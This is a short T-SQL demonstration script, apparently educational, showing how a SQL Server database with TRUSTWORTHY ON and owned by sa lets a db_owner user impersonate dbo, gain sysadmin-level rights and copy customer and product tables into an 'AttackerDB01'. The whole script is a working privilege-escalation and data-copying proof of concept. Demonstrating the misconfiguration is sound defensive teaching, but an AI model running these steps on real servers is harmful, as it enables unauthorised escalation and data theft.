use [master];
go
--// Create sample databases to use for demo
--// Set Trustworthy ON for sample database
create database TrustedDB01;
go
alter database TrustedDB01
	set trustworthy on
;
GO

--// Set owner to SA for DB01 and owner account for DB02
--// Crete a user for the demo user and set to be member of db_owner role
use TrustedDB01;
go
exec sp_changedbowner @loginame = N'sa', @map = false;
create user [DemoUser] for login [DemoUser];
alter role [db_owner] add member [DemoUser];
GO

use TrustedDB01;
go

--// Use the ability of db_owner to simulate the ability to execute code 
--// as another user, in this case dbo. 
execute as user  = 'dbo';
	--// Create a database at the server level
	create database AttackerDB01;
	go
	--// Get data from other databases.
	select *
	into AttackerDB01.dbo.Customers
	from AdventureWorks2014.sales.Customer
	;
	select *
	into AttackerDB01.dbo.Products
	from AdventureWorks2014.Production.Product
	;
--// Revert to permissions context of logged in user.
revert
--// This works as the server will trust the code 
--// executed in the context of the database in the scope of the server.
--// Because the owner of the database is a SysAdmin, this gives SysAdmin permissions to the DBO

--// Set context to a different database, just being tidy.
use [tempdb];
go